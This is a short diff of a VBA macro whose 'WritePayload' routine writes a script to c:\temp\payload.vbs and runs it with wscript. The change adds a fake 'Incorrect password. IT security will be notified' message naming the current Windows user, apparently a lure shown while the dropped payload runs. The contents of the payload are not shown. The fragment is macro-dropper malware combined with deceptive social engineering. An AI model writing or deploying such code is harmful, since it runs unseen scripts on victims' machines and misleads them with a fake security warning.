@@ -27,4 +27,5 @@ Sub WritePayload()
     Print #PayLoadFile, "End Sub"
     Close PayLoadFile
     Shell "wscript c:\temp\payload.vbs"
+    MsgBox "Incorrect password. IT security will be notified following"" further violations by" & (Environ$("Username"))
 End Sub
